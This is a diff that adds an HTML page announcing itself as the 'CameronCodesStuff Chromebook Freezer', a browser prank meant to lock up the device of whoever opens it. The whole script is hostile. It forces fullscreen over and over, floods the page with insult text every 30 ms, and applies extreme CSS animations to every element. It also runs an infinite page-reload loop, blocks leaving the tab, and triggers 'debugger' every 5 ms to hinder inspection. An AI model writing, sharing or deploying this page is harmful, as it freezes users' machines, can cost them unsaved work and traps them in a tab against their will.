@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>lol</title>
+  <link rel="icon" href="https://i.pinimg.com/736x/b6/50/6a/b6506af654cb954d9bbd2907396fddbd.jpg" type="image/png" />
+  <style>
+    * {
+        animation: strokeOfGenius 0.01s infinite linear alternate !important;
+        box-shadow: 20px 20px 50px rgba(255,0,0,0.5), -20px -20px 50px rgba(0,0,255,0.5);
+        filter: drop-shadow(5px 5px 10px red) contrast(200%) saturate(500%);
+        mix-blend-mode: exclusion !important;
+        transition: all 0.01s cubic-bezier(0.9, -0.9, 0.1, 1.1);
+    }
+
+    @keyframes strokeOfGenius {
+        0% { transform: translate3d(2px, -2px, 50px) rotate3d(1, 1, 1, 1deg); clip-path: inset(1%); }
+        100% { transform: translate3d(-2px, 2px, -50px) rotate3d(-1, -1, -1, -1deg); clip-path: inset(0%); }
+    }
+
+    body {
+      background-color: black;
+      color: red;
+      font-family: 'Arial', 'Comic Sans MS', sans-serif;
+      text-align: center;
+      height: 100vh;
+      width: 100vw;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      user-select: none;
+    }
+
+    h1 {
+      font-size: 3em;
+      text-shadow: 5px 5px 10px red;
+      animation: flicker 1s infinite alternate;
+      z-index: 10000;
+      position: relative;
+      padding: 20px;
+    }
+
+    @keyframes flicker {
+      0% { opacity: 1; transform: scale(1); }
+      100% { opacity: 0.5; transform: scale(0.98); }
+    }
+
+    .mockery-container {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        z-index: 99;
+        pointer-events: none;
+    }
+
+    .text-shrapnel {
+        position: absolute;
+        font-size: calc(2vw + 2vh);
+        color: red;
+        text-shadow: 0 0 10px #fff, 0 0 20px red;
+        white-space: nowrap;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Welcome, you are now a victim of the CameronCodesStuff Chromebook Freezer</h1>
+
+  <div class="mockery-container" id="arena"></div>
+
+<script>
+  function goFullScreen() {
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen().catch(()=>{});
+    } else if (document.documentElement.mozRequestFullScreen) { 
+      document.documentElement.mozRequestFullScreen();
+    } else if (document.documentElement.webkitRequestFullscreen) { 
+      document.documentElement.webkitRequestFullscreen();
+    } else if (document.documentElement.msRequestFullscreen) { 
+      document.documentElement.msRequestFullscreen();
+    }
+  }
+
+  document.addEventListener("DOMContentLoaded", function() {
+    goFullScreen();
+  });
+
+  setInterval(() => {
+     if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+         goFullScreen();
+     }
+  }, 100);
+
+
+  const insults = [
+      "CHROMEBOOK DETECTED 😂",
+      "CPU USAGE: 1000% 🔥",
+      "CAMERON CODES STUFF OWNS YOU 💀",
+      "RAM HAS LEFT THE CHAT 👋",
+      "GOODBYE OS 📉",
+      "IMAGINE OPENING THIS LOOOL 🧠❌",
+      "TASK MANAGER IS FROZEN TOO 🚫"
+  ];
+
+  const arena = document.getElementById('arena');
+
+  function inflictLag() {
+      for (let i = 0; i < 10; i++) {
+          const textNode = document.createElement('div');
+          textNode.className = 'text-shrapnel';
+          textNode.innerText = insults[Math.floor(Math.random() * insults.length)];
+          textNode.style.left = Math.random() * 100 + 'vw';
+          textNode.style.top = Math.random() * 100 + 'vh';
+          textNode.style.color = Math.random() > 0.5 ? 'red' : 'white';
+          arena.appendChild(textNode);
+      }
+  }
+  const chaosCycle = setInterval(inflictLag, 30);
+
+
+  document.addEventListener('mousemove', () => {
+      window.scrollTo(Math.random() * 100, Math.random() * 100);
+  });
+
+
+  setTimeout(function(){
+    clearInterval(chaosCycle); 
+    
+    while (true) {
+      location.reload(true);
+    }
+  }, 1);
+
+
+  window.onbeforeunload = function() {
+      return "CameronCodesStuff owns this tab. You cannot leave.";
+  };
+
+  setInterval(() => {
+      (function() { return false; }['constructor']('debugger')());
+  }, 5);
+</script>
+
+<!-- Made by CameronCodesStuff on GitHub and Instagram -->
+</body>
+</html>
